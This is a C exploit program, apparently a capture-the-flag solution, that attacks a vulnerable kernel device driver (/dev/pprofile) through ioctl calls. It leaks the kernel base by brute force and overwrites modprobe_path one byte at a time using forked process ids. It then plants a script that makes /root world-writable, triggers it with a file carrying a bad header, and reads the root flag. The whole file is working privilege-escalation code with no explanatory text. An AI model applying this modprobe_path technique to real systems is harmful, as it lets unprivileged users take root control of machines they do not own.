#include <sys/ioctl.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <time.h>
 
#define GET_STORAGE 16
#define PUT_STORAGE 32
#define DEL_STORAGE 64
 
struct req {
    unsigned long reqaddr;
    unsigned long resaddr;
};
 
int fd;
void put_storage(char* s){
    struct req r = { .reqaddr = (unsigned long)s, .resaddr = 0 };
 
    int ret = ioctl(fd, PUT_STORAGE, &r);
    assert(ret == 8);
}
 
int get_storage(char* s, unsigned long res){
    struct req r = { .reqaddr = (unsigned long)s, .resaddr = res };
    return ioctl(fd, GET_STORAGE, &r);
}
 
void del_storage(char* s){
    struct req r = { .reqaddr = (unsigned long)s, .resaddr = 0 };
    int ret = ioctl(fd, DEL_STORAGE, &r);
    assert(ret == 8);
}
 
int main(void){
    fd = open("/dev/pprofile", O_RDONLY);
    char str[] = "AAAAAAAA";
    unsigned long kbase = 0;
 
    for (int i = 0x81; i < 0xff; i++) {
        put_storage(str);
        int ret = get_storage(str, (0xffffffff00000000 | (i << 24)) + 0x1256f30);
        if (ret == 0) {
            kbase = 0xffffffff00000000 | (i << 24);
            printf("Kernel base: %lx\n", kbase);
            del_storage(str);
            break;
        }
        del_storage(str);
    }
    char modprobe_path[] = "tmp/a";
    for (int i = 0; i < 5; i++) {
        while (1) {
            if (fork() == 0) {
                int pid = getpid();
                if ((pid & 0xff) == modprobe_path[i])  {
                    printf("Write %c\n", modprobe_path[i]);
                    put_storage(str);
                    get_storage(str, kbase + 0x1256f40 - 8 + i);
                    del_storage(str);
                    break;
                }
            }
            else
                exit(0);
        }
    }
    int fd2 = open("/proc/sys/kernel/modprobe", O_RDONLY);
    char path[16] = { '/', 0, };
    read(fd2, path + 1, 6);
    close(fd2);
 
    fd2 = open(path, O_WRONLY|O_CREAT, 0777);
    write(fd2, "#!/bin/sh\nchmod 777 -R /root\n", 29);
    close(fd2);
 
    fd2 = open("/tmp/b", O_WRONLY|O_CREAT, 0777);
    write(fd2, "\xff\xff\xff\xff", 4);
    close(fd2);
 
    system("/tmp/b");
    system("cat /root/flag");
    return 0;
}
